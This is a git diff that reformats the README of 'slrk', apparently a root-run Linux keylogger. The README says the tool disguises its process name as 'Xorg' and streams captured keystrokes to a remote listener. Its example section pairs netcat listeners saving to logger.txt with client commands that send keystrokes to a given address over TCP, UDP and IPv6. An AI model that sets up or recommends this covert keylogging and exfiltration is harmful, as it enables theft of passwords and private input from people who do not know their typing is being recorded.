@@ -9,9 +9,8 @@
 	Process name is renamed as "Xorg".
 	It works with both TCP and UDP and with ipv6 too.
 	It must be run as root.
-```
-Usage: #./slrk [OPTIONS]
-```
+
+Usage: \#./slrk [OPTIONS]
 
 ##OPTIONS
 	-d <input-device>:			If not specified, the default device is '/dev/input/by-path/***kbd'
@@ -20,20 +19,15 @@ Usage: #./slrk [OPTIONS]
 
 ##EXAMPLE
 
-	###[TCP]
-	```
+	[TCP]
 	Server$ nc -lvp 8888 > logger.txt
-	Client#./slrk -m remote -a 127.0.0.1 -p 8888
-	```
+	Client\#./slrk -m remote -a 127.0.0.1 -p 8888
 
-	###[UDP]
-	```
+	[UDP]
 	Server$ nc -u -lvp 8888 > logger.txt
-	Client#./slrk -m remote -a 127.0.0.1 -p 8888
-	```
+	Client\#./slrk -m remote -a 127.0.0.1 -p 8888
 
-	###[IPv6]
-	```
+	[IPv6]
 	Server$ nc -6 -lvp 8888 > logger.txt
-	Client#./slrk -m remote -a ::1 -p 8888
-	```
+	Client\#./slrk -m remote -a ::1 -p 8888
+	
